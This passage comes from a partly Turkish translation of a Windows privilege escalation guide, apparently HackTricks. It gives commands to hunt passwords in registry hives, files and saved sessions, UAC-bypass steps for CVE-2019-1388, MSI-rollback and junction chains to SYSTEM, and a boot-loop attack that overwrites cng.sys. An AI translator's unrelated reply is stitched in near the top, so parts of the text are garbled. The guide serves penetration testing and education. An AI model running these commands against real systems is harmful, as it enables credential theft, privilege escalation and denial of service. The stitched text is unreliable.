%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
I don't have access to your repository to search files. Please paste the contents of src/windows-hardening/windows-local-privilege-escalation/README.md (or the list of files you want translated). I will translate the English text to Turkish and preserve all markdown, links, tags and paths exactly as requested.
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Credentials in the RecycleBin

Ayrıca Bin'i, içinde credentials olup olmadığını görmek için kontrol etmelisiniz

Birçok program tarafından kaydedilen **parolaları kurtarmak** için şu adresi kullanabilirsiniz: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Inside the registry

**Credentials içerebilecek diğer registry anahtarları**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Tarayıcı Geçmişi

Parolaların saklandığı **Chrome veya Firefox** db'lerini kontrol etmelisiniz.\
Ayrıca tarayıcıların geçmişini, yer imlerini ve favorilerini kontrol edin; belki bazı **parolalar** orada saklıdır.

Tarayıcılardan parola çıkarmak için araçlar:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)**, Windows işletim sistemi içinde yer alan ve farklı dillerde yazılmış yazılım bileşenleri arasında **intercommunication** sağlayan bir teknolojidir. Her COM bileşeni **class ID (CLSID) ile tanımlanır** ve her bileşen bir veya daha fazla arayüz (interface) aracılığıyla işlevsellik sunar; bu arayüzler **interface ID (IIDs)** ile tanımlanır.

COM sınıfları ve arayüzleri sırasıyla **HKEY\CLASSES\ROOT\CLSID** ve **HKEY\CLASSES\ROOT\Interface** altında kayıt defterinde tanımlanır. Bu kayıt defteri, **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** birleştirilerek oluşturulur = **HKEY\CLASSES\ROOT.**

Bu kayıt defterinin CLSID'leri içinde, bir **DLL**'e işaret eden bir **default value** ve **ThreadingModel** adlı bir değeri içeren **InProcServer32** adlı alt kayıt bulunur; ThreadingModel değeri **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) veya **Neutral** (Thread Neutral) olabilir.

![](<../../images/image (729).png>)

Temelde, yürütülecek herhangi bir **DLL'in üzerine yazabilirseniz**, o DLL farklı bir kullanıcı tarafından çalıştırıldığında **escalate privileges** elde edebilirsiniz.

To learn how attackers use COM Hijacking as a persistence mechanism check:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Generic Password search in files and registry**

Dosya içeriklerini ara
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Belirli bir dosya adına sahip bir dosyayı ara**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Kayıt defterinde anahtar adları ve parolaları ara**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Parolaları arayan araçlar

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** eklentisidir. Bu eklentiyi, hedef içindeki **kimlik bilgilerini arayan tüm metasploit POST modüllerini otomatik olarak çalıştırmak** için oluşturdum.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) bu sayfada bahsedilen şifreleri içeren tüm dosyaları otomatik olarak arar.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) bir sistemden şifreleri çıkarmak için başka harika bir araçtır.

Bu araç [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher), veriyi düz metin olarak saklayan çeşitli araçların (PuTTY, WinSCP, FileZilla, SuperPuTTY ve RDP) **oturumlarını**, **kullanıcı adlarını** ve **şifrelerini** arar.
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Imagine that **a process running as SYSTEM open a new process** (`OpenProcess()`) with **full access**. The same process **also create a new process** (`CreateProcess()`) **with low privileges but inheriting all the open handles of the main process**.\
Then, if you have **full access to the low privileged process**, you can grab the **open handle to the privileged process created** with `OpenProcess()` and **inject a shellcode**.\
[Read this example for more information about **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)\
[Read this **other post for a more complete explanation on how to test and abuse more open handlers of processes and threads inherited with different levels of permissions (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Ortak bellek bölümleri, **pipes** olarak anılan, işlem iletişimi ve veri aktarımını sağlar.

Windows provides a feature called **Named Pipes**, allowing unrelated processes to share data, even over different networks. This resembles a client/server architecture, with roles defined as **named pipe server** and **named pipe client**.

When data is sent through a pipe by a **client**, the **server** that set up the pipe has the ability to **take on the identity** of the **client**, assuming it has the necessary **SeImpersonate** rights. Identifying a **privileged process** that communicates via a pipe you can mimic provides an opportunity to **gain higher privileges** by adopting the identity of that process once it interacts with the pipe you established. For instructions on executing such an attack, helpful guides can be found [**here**](named-pipe-client-impersonation.md) and [**here**](#from-high-integrity-to-system).

Ayrıca aşağıdaki araç, burp gibi bir araçla **named pipe iletişimini intercept etmeye** imkan verir: [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **ve bu araç tüm pipe'ları listeleyip görerek privesc bulmaya yardımcı olur** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

The Telephony service (TapiSrv) in server mode exposes `\\pipe\\tapsrv` (MS-TRP). A remote authenticated client can abuse the mailslot-based async event path to turn `ClientAttach` into an arbitrary **4-byte write** to any existing file writable by `NETWORK SERVICE`, then gain Telephony admin rights and load an arbitrary DLL as the service. Full flow:

- `ClientAttach` with `pszDomainUser` set to a writable existing path → the service opens it via `CreateFileW(..., OPEN_EXISTING)` and uses it for async event writes.
- Each event writes the attacker-controlled `InitContext` from `Initialize` to that handle. Register a line app with `LRegisterRequestRecipient` (`Req_Func 61`), trigger `TRequestMakeCall` (`Req_Func 121`), fetch via `GetAsyncEvents` (`Req_Func 0`), then unregister/shutdown to repeat deterministic writes.
- Add yourself to `[TapiAdministrators]` in `C:\Windows\TAPI\tsec.ini`, reconnect, then call `GetUIDllName` with an arbitrary DLL path to execute `TSPI_providerUIIdentify` as `NETWORK SERVICE`.

More details:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### File Extensions that could execute stuff in Windows

Check out the page **[https://filesec.io/](https://filesec.io/)**

### Protocol handler / ShellExecute abuse via Markdown renderers

Clickable Markdown links forwarded to `ShellExecuteExW` can trigger dangerous URI handlers (`file:`, `ms-appinstaller:` or any registered scheme) and execute attacker-controlled files as the current user. See:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitoring Command Lines for passwords**

When getting a shell as a user, there may be scheduled tasks or other processes being executed which **pass credentials on the command line**. The script below captures process command lines every two seconds and compares the current state with the previous state, outputting any differences.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## İşlemlerden parolaların çalınması

## Düşük ayrıcalıklı kullanıcıdan NT\AUTHORITY SYSTEM'e (CVE-2019-1388) / UAC Bypass

Eğer grafik arayüze (konsol veya RDP aracılığıyla) erişiminiz varsa ve UAC etkinse, bazı Microsoft Windows sürümlerinde ayrıcalıksız bir kullanıcıdan "NT\AUTHORITY SYSTEM" gibi bir terminali veya başka herhangi bir süreci çalıştırmak mümkündür.

Bu, aynı güvenlik açığı ile ayrıcalıkları yükseltmeyi ve aynı zamanda UAC'yi atlamayı mümkün kılar. Ayrıca herhangi bir şey yüklemeye gerek yoktur ve süreçte kullanılan binary Microsoft tarafından imzalanmış ve yayımlanmıştır.

Etkilenen bazı sistemler şunlardır:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Bu zafiyetten yararlanmak için aşağıdaki adımların uygulanması gerekir:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
You have all the necessary files and information in the following GitHub repository:

https://github.com/jas502n/CVE-2019-1388

## From Administrator Medium to High Integrity Level / UAC Bypass

Read this to **learn about Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Then **read this to learn about UAC and UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## From Arbitrary Folder Delete/Move/Rename to SYSTEM EoP

The technique described [**in this blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) with a exploit code [**available here**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

Saldırı esasen Windows Installer'ın rollback (geri alma) özelliğinin kötüye kullanılmasıyla, kaldırma işlemi sırasında meşru dosyaların kötü amaçlı olanlarla değiştirilmesini içerir. Bunun için saldırganın, `C:\Config.Msi` klasörünü ele geçirmek üzere kullanılacak **kötü amaçlı bir MSI installer** oluşturması gerekir; Windows Installer daha sonra diğer MSI paketlerinin kaldırılması sırasında rollback dosyalarını depolamak için bu klasörü kullanacaktır ve rollback dosyaları kötü amaçlı payload içerecek şekilde değiştirilmiş olacaktır.

Özet teknik şöyledir:

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI
- Bir `.msi` oluşturun ve yazılabilir bir klasöre (`TARGETDIR`) zararsız bir dosya (ör. `dummy.txt`) yükleyin.
- Installer'ı **"UAC Compliant"** olarak işaretleyin, böylece **non-admin user** çalıştırabilir.
- Kurulumdan sonra dosyaya bir **handle** açık tutun.

- Step 2: Begin Uninstall
- Aynı `.msi`'yi kaldırın.
- Kaldırma işlemi dosyaları `C:\Config.Msi`'ye taşımaya ve bunları `.rbf` dosyası olarak yeniden adlandırmaya başlar (rollback yedekleri).
- Dosya `C:\Config.Msi\<random>.rbf` olduğunda tespit etmek için `GetFinalPathNameByHandle` kullanarak **açık dosya handle'ını poll edin**.

- Step 3: Custom Syncing
- `.msi`, şu özelliğe sahip **özel bir uninstall action (`SyncOnRbfWritten`)** içerir:
- `.rbf` yazıldığında sinyal verir.
- Ardından kaldırma işlemine devam etmeden önce başka bir event üzerinde **bekler**.

- Step 4: Block Deletion of `.rbf`
- Sinyal alındığında, `.rbf` dosyasını `FILE_SHARE_DELETE` olmadan **açın** — bu, dosyanın **silinmesini engeller**.
- Ardından kaldırmanın bitmesine izin vermek için **geri sinyal verin**.
- Windows Installer `.rbf`'yi silemez ve içindeki tüm içerikleri silemediği için **`C:\Config.Msi` kaldırılmaz**.

- Step 5: Manually Delete `.rbf`
- Siz (saldırgan) `.rbf` dosyasını manuel olarak silin.
- Şimdi **`C:\Config.Msi` boş** ve ele geçirilmek üzere hazırdır.

> Bu noktada, `C:\Config.Msi` dizinini silmek için **SYSTEM-level arbitrary folder delete vulnerability**'yi tetikleyin.

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- `C:\Config.Msi` klasörünü tekrar oluşturun.
- **Zayıf DACL'ler** (ör. Everyone:F) ayarlayın ve `WRITE_DAC` ile bir handle **açık tutun**.

- Step 7: Run Another Install
- `.msi`'yi tekrar kurun, şu ayarlarla:
- `TARGETDIR`: Yazılabilir konum.
- `ERROROUT`: zorunlu bir hata tetikleyecek değişken.
- Bu kurulum tekrar **rollback**'i tetikleyecek ve `.rbs` ile `.rbf` okunacaktır.

- Step 8: Monitor for `.rbs`
- `ReadDirectoryChangesW` kullanarak `C:\Config.Msi`'yi yeni bir `.rbs` görünene kadar izleyin.
- Oluşan dosya adını yakalayın.

- Step 9: Sync Before Rollback
- `.msi`, şu özelliğe sahip bir **özel install action (`SyncBeforeRollback`)** içerir:
- `.rbs` oluşturulduğunda bir event sinyali verir.
- Ardından devam etmeden önce **bekler**.

- Step 10: Reapply Weak ACL
- `.rbs created` event'ini aldıktan sonra:
- Windows Installer `C:\Config.Msi`'ye **güçlü ACL'ler** uygular.
- Ancak siz `WRITE_DAC` ile hâlâ bir handle açık tuttuğunuz için **zayıf ACL'leri tekrar uygulayabilirsiniz**.

> ACL'ler **sadece handle açıldığında uygulanır**, dolayısıyla klasöre yazmaya devam edebilirsiniz.

- Step 11: Drop Fake `.rbs` and `.rbf`
- `.rbs` dosyasını, Windows'a şunu söyleyen **sahte bir rollback script** ile overwrite edin:
- `.rbf` (kötü amaçlı DLL) dosyanızı ayrıcalıklı bir konuma (ör. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`) geri yüklemesini belirtin.
- Kötü amaçlı SYSTEM-seviyesinde payload içeren sahte `.rbf`'nizi bırakın.

- Step 12: Trigger the Rollback
- Installer'ın devam etmesi için sync event'ini sinyalleyin.
- Bir **type 19 custom action (`ErrorOut`)**, kurulumu bilinen bir noktada kasıtlı olarak **hata** vercek şekilde yapılandırılmıştır.
- Bu, **rollback**'in başlamasına neden olur.

- Step 13: SYSTEM Installs Your DLL
- Windows Installer:
- Kötü amaçlı `.rbs`'inizi okur.
- `.rbf` DLL'inizi hedef konuma kopyalar.
- Artık **kötü amaçlı DLL'iniz SYSTEM tarafından yüklenen bir yol**da yer alır.

- Final Step: Execute SYSTEM Code
- DLL'i yükleyecek güvenilir bir **auto-elevated binary** (ör. `osk.exe`) çalıştırın.
- **Boom**: Kodunuz **SYSTEM olarak** çalıştırılır.

### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

Ana MSI rollback tekniği (önceki) bir **tüm klasörü** silme yeteneğiniz olduğunu varsayar (ör. `C:\Config.Msi`). Peki ya zaafiyetiniz yalnızca **arbitrary file deletion** izni veriyorsa?

NTFS iç yapısını kullanabilirsiniz: her klasörün gizli bir alternate data stream'i vardır, adı:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Bu stream klasörün **index metadata** bilgisini saklar.

Yani, bir klasörün `::$INDEX_ALLOCATION` stream'ini **silerseniz**, NTFS klasörü **tamamen dosya sisteminden kaldırır**.

Bunu şu gibi standart dosya silme API'leri kullanarak yapabilirsiniz:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Bir *file* silme API'sini çağırıyor olsanız bile, bu **klasörün kendisini siliyor**.

### From Folder Contents Delete to SYSTEM EoP
Eğer primitive’iniz rastgele dosya/klasörleri silmenize izin vermiyorsa, fakat saldırgan tarafından kontrol edilen bir klasörün *contents*'ının silinmesine izin veriyorsa ne olur?

1. Step 1: Tuzak bir klasör ve dosya oluşturun
- Oluşturun: `C:\temp\folder1`
- İçine: `C:\temp\folder1\file1.txt`

2. Step 2: `file1.txt` üzerinde bir **oplock** yerleştirin
- Bu oplock, ayrıcalıklı bir süreç `file1.txt`'i silmeye çalıştığında yürütmeyi **duraklatır**.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Adım 3: SYSTEM sürecini tetikleyin (ör. `SilentCleanup`)
- Bu süreç klasörleri tarar (ör. `%TEMP%`) ve içindeki öğeleri silmeye çalışır.
- `file1.txt`'e ulaştığında, **oplock triggers** ve kontrolü callback'inize devreder.

4. Adım 4: Oplock callback içinde – silme işlemini yönlendir

- Seçenek A: `file1.txt`'i başka bir yere taşıyın
- Bu, `folder1`'i oplock'u bozmeden boşaltır.
- `file1.txt`'i doğrudan silmeyin — bu oplock'un erken serbest kalmasına neden olur.

- Seçenek B: `folder1`'i bir **junction**'a dönüştürün:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Seçenek C: `\RPC Control` içinde bir **symlink** oluşturun:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Bu, klasör meta verilerini depolayan NTFS iç akışını hedef alır — bunu silmek klasörü siler.

5. Adım: Oplock'u serbest bırak
- SYSTEM işlemi devam eder ve `file1.txt`'i silmeye çalışır.
- Ancak şimdi, junction + symlink nedeniyle, aslında şunu siliyor:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Sonuç**: `C:\Config.Msi` SYSTEM tarafından silinir.

### Rasgele Klasör Oluşturmadan Kalıcı DoS'a

Bir primitive'i istismar edin; bu primitive size **SYSTEM/admin olarak rasgele bir klasör oluşturma** imkanı verir — hatta **dosya yazamıyorsanız** veya **zayıf izinler ayarlayamıyorsanız** bile.

Kritik bir **Windows sürücüsünün** adını taşıyan bir **klasör** (dosya değil) oluşturun, örneğin:
```
C:\Windows\System32\cng.sys
```
- Bu yol normalde `cng.sys` kernel-mod sürücüsüne karşılık gelir.
- Eğer bunu **önceden klasör olarak oluşturursanız**, Windows önyüklemede gerçek sürücüyü yükleyemez.
- Sonra, Windows önyüklemede `cng.sys`'i yüklemeye çalışır.
- Klasörü görür, **gerçek sürücüyü çözemeyerek**, **çöker veya önyüklemeyi durdurur**.
- Harici müdahale olmadan (ör. önyükleme onarımı veya disk erişimi) **geri dönüş yolu yoktur**, ve **kurtarma yoktur**.

### İmtiyazlı log/backup yolları + OM symlinks ile rastgele dosya üzerine yazma / boot DoS

Bir **privileged service** loglar/exports'ı bir **writable config**'ten okunan bir yola yazdığında, bu yolu **Object Manager symlinks + NTFS mount points** ile yeniden yönlendirerek imtiyazlı yazmayı rastgele bir dosya üzerine yazmaya dönüştürebilirsiniz (hatta **SeCreateSymbolicLinkPrivilege** olmadan bile).

**Gereksinimler**
- Hedef yolu saklayan config dosyası saldırgan tarafından yazılabilir olmalı (ör. `%ProgramData%\...\.ini`).
- `\RPC Control` için bir mount point ve bir OM file symlink oluşturma yeteneği (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).
- O yola yazan bir **privileged operation** (log, export, report).

**Örnek zincir**
1. Config'i okuyarak imtiyazlı log hedefini öğrenin, örn. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` in `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Admin olmadan yolu yönlendir:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Ayrıcalıklı bileşenin logu yazmasını bekleyin (ör. admin "send test SMS" tetikler). Yazma işlemi artık `C:\Windows\System32\cng.sys` konumuna düşer.
4. Üzerine yazılan hedefi (hex/PE parser) bozulmayı doğrulamak için inceleyin; yeniden başlatma Windows'u değiştirilmiş sürücü yolunu yüklemeye zorlar → **boot loop DoS**. Bu, ayrıcalıklı bir service'in yazma için açacağı herhangi bir korumalı dosyaya genellenir.

> `cng.sys` normalde `C:\Windows\System32\drivers\cng.sys`'den yüklenir, ancak `C:\Windows\System32\cng.sys` içinde bir kopyası varsa önce denenebilir, bu da bozuk veri için güvenilir bir DoS hedefi yapar.



## **High Integrity'den System'e**

### **Yeni servis**

Zaten High Integrity bir process üzerinde çalışıyorsanız, **SYSTEM'e giden yol** sadece **yeni bir servis oluşturup çalıştırmak** kadar kolay olabilir:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> service binary oluştururken bunun geçerli bir service olduğundan veya binary'nin gerekli işlemleri hızlıca gerçekleştirdiğinden emin olun; geçerli bir service değilse 20s içinde sonlandırılacaktır.

### AlwaysInstallElevated

High Integrity process'ten AlwaysInstallElevated kayıt defteri girdilerini etkinleştirmeyi deneyebilir ve bir _**.msi**_ wrapper kullanarak bir reverse shell yükleyebilirsiniz.  
[Kayıt defteri anahtarları ve bir _.msi_ paketinin nasıl yükleneceği hakkında daha fazla bilgi için buraya bakın.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Kodu [burada bulabilirsiniz](seimpersonate-from-high-to-system.md).**

### From SeDebug + SeImpersonate to Full Token privileges

Eğer bu token ayrıcalıklarına sahipseniz (muhtemelen zaten bir High Integrity process içinde bulacaksınız), SeDebug ayrıcalığı ile neredeyse herhangi bir süreci (protected process olmayan) açabilir, sürecin token'ını kopyalayabilir ve o token ile rastgele bir process oluşturabilirsiniz.  
Bu teknik genellikle tüm token ayrıcalıklarına sahip SYSTEM olarak çalışan herhangi bir süreci seçmeyi içerir (_evet, tüm token ayrıcalıklarına sahip olmayan SYSTEM process'leri bulabilirsiniz_).  
**Bu tekniği uygulayan bir kod örneğini [burada bulabilirsiniz](sedebug-+-seimpersonate-copy-token.md).**

### **Named Pipes**

Bu teknik meterpreter tarafından getsystem'de yükselmek için kullanılır. Teknik, **bir pipe oluşturup sonra o pipe'a yazması için bir service oluşturmak/suistimal etmek** üzerine kuruludur. Ardından, pipe'ı `SeImpersonate` ayrıcalığı ile oluşturan **server**, pipe client'ının (service'in) token'ını **impersonate** ederek SYSTEM ayrıcalıkları elde edebilir.  
Eğer named pipes hakkında daha fazla bilgi istiyorsanız [**burayı okuyun**](#named-pipe-client-impersonation).  
Named pipes ile high integrity'den System'e nasıl geçileceğine dair bir örnek okumak istiyorsanız [**bunu okuyun**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Eğer SYSTEM olarak çalışan bir process tarafından load edilen bir dll'i hijack etmeyi başarırsanız, bu izinlerle rastgele kod çalıştırabilirsiniz. Bu yüzden Dll Hijacking bu tür privilege escalation için faydalıdır ve ayrıca high integrity process'ten ulaşılması çok daha kolaydır çünkü dll'lerin yüklendiği klasörlerde write permissions'e sahiptir.  
**Dll hijacking hakkında daha fazla bilgi için [buraya bakın](dll-hijacking/index.html).**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Read:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Windows local privilege escalation vektörlerini aramak için en iyi araç:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)  
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Yanlış yapılandırmaları ve hassas dosyaları kontrol eder (**[**buradan kontrol edin**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Tespit edildi.**  
[**JAWS**](https://github.com/411Hall/JAWS) **-- Bazı olası yanlış yapılandırmaları kontrol eder ve bilgi toplar (**[**buradan kontrol edin**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**  
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Yanlış yapılandırmaları kontrol eder**  
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY, WinSCP, SuperPuTTY, FileZilla ve RDP kayıtlı oturum bilgilerini çıkarır. Yerelde -Thorough kullanın.**  
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager'dan kimlik bilgilerini çıkarır. Tespit edildi.**  
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Toplanan parolaları domain üzerinde spray eder**  
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh bir PowerShell ADIDNS/LLMNR/mDNS spoofer ve man-in-the-middle aracıdır.**  
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Temel privesc Windows enumerasyonu**  
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Bilinen privesc zafiyetlerini arar (DEPRECATED for Watson)  
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Yerel kontroller **(Admin hakları gerekiyor)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Bilinen privesc zafiyetlerini arar (VisualStudio kullanılarak derlenmesi gerekiyor) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))  
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Yanlış yapılandırmaları arayarak host'u enumerate eder (daha çok bilgi toplama aracı, privesc'ten ziyade) (derlenmesi gerekiyor) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**  
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Birçok yazılımdan kimlik bilgilerini çıkarır (github'da precompiled exe)**  
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp'ın C# portu**  
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Yanlış yapılandırmaları kontrol eder (exe github'da önceden derlenmiş). Önerilmez. Win10'da iyi çalışmıyor.  
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Olası yanlış yapılandırmaları kontrol eder (python'dan exe). Önerilmez. Win10'da iyi çalışmıyor.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Bu gönderiye dayanarak oluşturulmuş araç (proper çalışması için accesschk'e ihtiyaç duymaz ama kullanabilir).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** çıktısını okur ve çalışabilecek exploitleri önerir (yerel python)  
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** çıktısını okur ve çalışabilecek exploitleri önerir (yerel python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Projeyi doğru .NET sürümü kullanarak derlemelisiniz ([bkz.](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Hedef makinede yüklü .NET sürümünü görmek için şunu yapabilirsiniz:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Referanslar

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
